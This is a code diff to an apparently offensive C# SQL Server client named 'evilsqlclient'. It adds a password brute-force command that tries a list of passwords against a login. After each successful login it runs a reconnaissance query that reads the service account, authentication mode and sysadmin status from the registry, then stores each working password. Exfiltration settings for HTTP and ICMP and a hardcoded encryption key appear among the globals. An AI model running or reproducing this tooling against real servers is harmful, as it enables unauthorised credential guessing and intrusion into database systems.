@@ -24,12 +24,14 @@ using System.Net;
 using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
 using System.Linq;
+using System.Configuration;
+using System.Runtime.InteropServices;
 
 namespace evilsqlclient
 {
     public class Program
     {
-        public void Main(string[] args)
+        public static void Main(string[] args)
         {
             EvilCommands ec = new EvilCommands();
 
@@ -84,27 +86,29 @@ namespace evilsqlclient
             // GLOBAL OBJECTS
             // --------------------------------	
             #region globalobjects
-            public DataTable MasterDiscoveredList = new DataTable();
-            public DataTable MasterAccessList = new DataTable();
-            public string ConnectionStringG = "";
-            public bool InstanceAllG = false;
-            public string InstanceG = "";
-            public string UsernameG = "";
-            public string UsertypeG = "CurrentWindowsUser";
-            public string PasswordG = "";
-            public bool ReadyforQueryG = false;
-            public bool ExportFileStateG = false;
-            public string ExportFilePathG = "c:\\windows\\temp\\output.csv";
-            public bool HttpStateG = false;
-            public string HttpUrlG = "http://127.0.0.1";
-            public bool IcmpStateG = false;
-            public string IcmpIpG = "127.0.0.1";
-            public bool EncStateG = false;
-            public string EncKeyG = "AllGoodThings!";
-            public string EncSaltG = "CaptainSalty";
-            public string TimeOutG = "1";
-            public string DiscoveredCountG = "0";
-            public bool VerboseG = false;
+            private List<AccessInfo> AccessList = new List<AccessInfo>();
+            private DataTable MasterDiscoveredList = new DataTable();
+            private DataTable MasterAccessList = new DataTable();
+            private string ConnectionStringG = "";
+            private bool InstanceAllG = false;
+            private string InstanceG = "";
+            private string UsernameG = "";
+            private string UsertypeG = "CurrentWindowsUser";
+            private string PasswordG = "";
+            private string[] PassList;
+            private bool ReadyforQueryG = false;
+            private bool ExportFileStateG = false;
+            private string ExportFilePathG = "c:\\windows\\temp\\output.csv";
+            private bool HttpStateG = false;
+            private string HttpUrlG = "http://127.0.0.1";
+            private bool IcmpStateG = false;
+            private string IcmpIpG = "127.0.0.1";
+            private bool EncStateG = false;
+            private string EncKeyG = "AllGoodThings!";
+            private string EncSaltG = "CaptainSalty";
+            private string TimeOutG = "1";
+            private string DiscoveredCountG = "0";
+            private bool VerboseG = false;
             #endregion
 
             // --------------------------------
@@ -1715,6 +1719,160 @@ namespace evilsqlclient
                 return null;
             }
 
+            /// <summary>
+            /// Attempts to login to an instance with multiple possible passwords
+            /// </summary>
+            /// <param name="instance"></param>
+            /// <param name="username"></param>
+            /// <param name="passwords"></param>
+            public void CheckLoginPwList(string instance)
+            {
+                CheckQueryReady();
+                if (!ReadyforQueryG)
+                {
+                    Console.WriteLine("\nNo target instances have been defined.");
+                    return;
+                }
+
+                string fullcommand = @"
+							-- Get SQL Server Information
+
+							-- Get SQL Server Service Name and Path
+							DECLARE @SQLServerInstance varchar(250)
+							DECLARE @SQLServerServiceName varchar(250)
+							if @@SERVICENAME = 'MSSQLSERVER'
+							BEGIN
+							set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
+							set @SQLServerServiceName = 'MSSQLSERVER'
+							END
+							ELSE
+							BEGIN
+							set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
+							set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
+							END
+
+							-- Get SQL Server Service Account
+							DECLARE @ServiceaccountName varchar(250)
+							EXECUTE master.dbo.xp_instance_regread
+							N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
+							N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'
+
+							-- Get authentication mode
+							DECLARE @AuthenticationMode INT
+							EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+							N'Software\Microsoft\MSSQLServer\MSSQLServer',
+							N'LoginMode', @AuthenticationMode OUTPUT
+
+							-- Get the forced encryption flag
+							BEGIN TRY 
+								DECLARE @ForcedEncryption INT
+								EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+								N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
+								N'ForceEncryption', @ForcedEncryption OUTPUT
+							END TRY
+							BEGIN CATCH	            
+							END CATCH
+
+							-- Return server and version information
+							SELECT  @@servername as [Instance],
+							DEFAULT_DOMAIN() as [DomainName],
+							SERVERPROPERTY('processid') as ServiceProcessID,
+							@SQLServerServiceName as [ServiceName],
+							@ServiceAccountName as [ServiceAccount],
+							(SELECT CASE @AuthenticationMode
+							WHEN 1 THEN 'Windows Authentication'
+							WHEN 2 THEN 'Windows and SQL Server Authentication'
+							ELSE 'Unknown'
+							END) as [AuthenticationMode],
+							@ForcedEncryption as ForcedEncryption,
+							CASE  SERVERPROPERTY('IsClustered')
+							WHEN 0
+							THEN 'No'
+							ELSE 'Yes'
+							END as [Clustered],
+							SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
+							SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
+							serverproperty('Edition') as [SQLServerEdition],
+							SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
+							SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
+							RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
+							SYSTEM_USER as [Currentlogin],
+							(select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";
+
+                foreach (string password in PassList)
+                {
+                    Console.WriteLine($"\n{instance}: ATTEMPTING LOGIN with Username: {UsernameG} Password: {password}");
+                    SqlConnection conn = new SqlConnection(CreateConnectionString(instance, UsernameG, password, "SqlLogin", "master"));
+                    SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
+
+                    if (!OpenConnection(conn, instance))
+                    {
+                        return;
+                    }
+
+                    try
+                    {
+                        DataTable dt = new DataTable();
+                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
+                        da.Fill(dt);
+
+                        foreach (DataRow CurrentRecord in dt.Select())
+                        {
+                            Console.WriteLine();
+                            Console.WriteLine($"Instance             : {CurrentRecord["Instance"]}");
+                            Console.WriteLine($"Domain               : {CurrentRecord["DomainName"]}");
+                            Console.WriteLine($"Service PID          : {CurrentRecord["ServiceProcessID"]}");
+                            Console.WriteLine($"Service Name         : {CurrentRecord["ServiceName"]}");
+                            Console.WriteLine($"Service Account      : {CurrentRecord["ServiceAccount"]}");
+                            Console.WriteLine($"Authentication Mode  : {CurrentRecord["AuthenticationMode"]}");
+                            Console.WriteLine($"Forced Encryption    : {CurrentRecord["ForcedEncryption"]}");
+                            Console.WriteLine($"Clustered            : {CurrentRecord["Clustered"]}");
+                            Console.WriteLine($"SQL Version          : {CurrentRecord["SQLServerMajorVersion"]}");
+                            Console.WriteLine($"SQL Version Number   : {CurrentRecord["SQLServerVersionNumber"]}");
+                            Console.WriteLine($"SQL Edition          : {CurrentRecord["SQLServerEdition"]}");
+                            Console.WriteLine($"SQL Service Pack     : {CurrentRecord["SQLServerServicePack"]}");
+                            Console.WriteLine($"OS Architecture      : {CurrentRecord["OSArchitecture"]}");
+                            Console.WriteLine($"OS Version Number    : {CurrentRecord["OsVersionNumber"]}");
+                            Console.WriteLine($"Login                : {CurrentRecord["CurrentLogin"]}");
+                            Console.WriteLine($"Login is Sysadmin    : {CurrentRecord["IsSysadmin"]}");
+
+                            MasterAccessList.Rows.Add(
+                                CurrentRecord["Instance"].ToString(), 
+                                CurrentRecord["DomainName"].ToString(), 
+                                CurrentRecord["ServiceProcessID"].ToString(), 
+                                CurrentRecord["ServiceName"].ToString(), 
+                                CurrentRecord["ServiceAccount"].ToString(), 
+                                CurrentRecord["AuthenticationMode"].ToString(), 
+                                CurrentRecord["ForcedEncryption"].ToString(), 
+                                CurrentRecord["Clustered"].ToString(), 
+                                CurrentRecord["SQLServerMajorVersion"].ToString(), 
+                                CurrentRecord["SQLServerVersionNumber"].ToString(), 
+                                CurrentRecord["SQLServerEdition"].ToString(), 
+                                CurrentRecord["SQLServerServicePack"].ToString(), 
+                                CurrentRecord["OSArchitecture"].ToString(), 
+                                CurrentRecord["OsVersionNumber"].ToString(), 
+                                CurrentRecord["CurrentLogin"].ToString(), 
+                                CurrentRecord["IsSysadmin"].ToString(), 
+                                password
+                            );
+                            
+                            
+                            AccessList.Add(new AccessInfo(CurrentRecord) { CurrentLoginPassword = password });
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"{instance}: QUERY FAILED");
+                        if (VerboseG)
+                        {
+                            Console.WriteLine();
+                            Console.WriteLine(ex.Message);
+                            Console.WriteLine();
+                        }
+                    }
+                }
+            }
+
             // ------------------------------------------------------------
             // FUNCTION: LISTLOGINS
             // ------------------------------------------------------------	
@@ -1975,7 +2133,7 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: CHECKDEFAULTAPPPW 
             // ------------------------------------------------------------
-            public string CheckDefaultAppPw()
+            public void CheckDefaultAppPw()
             {
                 CheckQueryReady();
                 if (ReadyforQueryG)
@@ -2231,7 +2389,6 @@ namespace evilsqlclient
                 {
                     Console.WriteLine("\nNo target instances have been defined.");
                 }
-                return null;
             }
 
             // ------------------------------------------------------------
@@ -2405,6 +2562,48 @@ namespace evilsqlclient
                 }
 
                 return null;
+            }
+
+            /// <summary>
+            /// Opens a connection to the database and handles all relevent exeptions
+            /// </summary>
+            /// <param name="conn"></param>
+            /// <param name="instance"></param>
+            /// <returns></returns>
+            public bool OpenConnection(SqlConnection conn, string instance)
+            {
+                try
+                {
+                    conn.Open();
+                    return true;
+                }
+                catch (Exception ex)
+                {
+                    if (ex is InvalidOperationException)
+                    {
+                        Console.WriteLine($"{instance}: DATA SOURCE / SERVER WAS NOT SPECIFIED OR IS ALREADY OPEN");
+                    }
+                    else if (ex is SqlException)
+                    {
+                        var sqlex = ex as SqlException;
+                        if (18487 == sqlex.Number || 18488 == sqlex.Number)
+                        {
+                            Console.WriteLine($"{instance}: PASSWORD EXPIRED OR MUST BE RESET");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"{instance}: CONNECTION FAILED");
+                        }
+                    }
+
+                    if (VerboseG)
+                    {
+                        Console.WriteLine();
+                        Console.WriteLine(ex.Message);
+                    }
+
+                    return false;
+                }
             }
 
             // --------------------------------
@@ -2584,8 +2783,8 @@ namespace evilsqlclient
                     }
                     else if (multiline = MyQuery.Check("set passlist "))
                     {
-                        PasswordG = MyQuery.Replace("set password ", "");
-                        Console.WriteLine($"\nPassword set to: {PasswordG}");
+                        PassList = MyQuery.Replace("set password ", "").Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+                        Console.WriteLine($"\nPassword List set to: {PassList.Length} entries");
 
                         ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
                     }
@@ -2832,6 +3031,10 @@ namespace evilsqlclient
                     else if (multiline = MyQuery.Check("check defaultpw"))
                     {
                         CheckDefaultAppPw();
+                    }
+                    else if (multiline = MyQuery.Check("check bruteforce"))
+                    {
+                        CheckLoginPwList(MyQuery.ToLower().Replace("check bruteforce ", ""));
                     }
                     else if (multiline = MyQuery.Check("list databases"))
                     {
@@ -3183,6 +3386,59 @@ namespace evilsqlclient
                 // Return to console 
                 // RunSQLConsole();
                 return true;
+            }
+        }
+
+        private sealed class AccessInfo
+        {
+            public string Instance { get; set; }
+            public string DomainName { get; set; }
+            public uint ServiceProcessID { get; set; }
+            public string ServiceName { get; set; }
+            public string ServiceAccount { get; set; }
+            public string AuthenticationMode { get; set; }
+            public bool ForcedEncryption { get; set; }
+            public bool Clustered { get; set; }
+            public string SQLServerMajorVersion { get; set; }
+            public string SQLServerVersionNumber { get; set; }
+            public string SQLServerEdition { get; set; }
+            public string SQLServerServicePack { get; set; }
+            public string OSArchitecture { get; set; }
+            public string OsVersionNumber { get; set; }
+            public string CurrentLogin { get; set; }
+            public bool IsSysadmin { get; set; }
+            public string CurrentLoginPassword { get; set; }
+
+            public AccessInfo(DataRow currentRecord)
+            {
+                Instance = currentRecord["Instance"].ToString();
+                DomainName = currentRecord["DomainName"].ToString();
+                if (uint.TryParse(currentRecord["ServiceProcessID"].ToString(), out uint serviceProcessID))
+                {
+                    ServiceProcessID = serviceProcessID;
+                }
+                ServiceName = currentRecord["ServiceName"].ToString();
+                ServiceAccount = currentRecord["ServiceAccount"].ToString();
+                AuthenticationMode = currentRecord["AuthenticationMode"].ToString();
+                if (bool.TryParse(currentRecord["ForcedEncryption"].ToString(), out bool forcedEncryption))
+                {
+                    ForcedEncryption = forcedEncryption;
+                }
+                if (bool.TryParse(currentRecord["Clustered"].ToString(), out bool clustered))
+                {
+                    Clustered = clustered;
+                }
+                SQLServerMajorVersion = currentRecord["SQLServerMajorVersion"].ToString();
+                SQLServerVersionNumber = currentRecord["SQLServerVersionNumber"].ToString();
+                SQLServerEdition = currentRecord["SQLServerEdition"].ToString();
+                SQLServerServicePack = currentRecord["SQLServerServicePack"].ToString();
+                OSArchitecture = currentRecord["OSArchitecture"].ToString();
+                OsVersionNumber = currentRecord["OsVersionNumber"].ToString();
+                CurrentLogin = currentRecord["CurrentLogin"].ToString();
+                if (bool.TryParse(currentRecord["IsSysadmin"].ToString(), out bool isSysadmin))
+                {
+                    IsSysadmin = isSysadmin;
+                }
             }
         }
     }
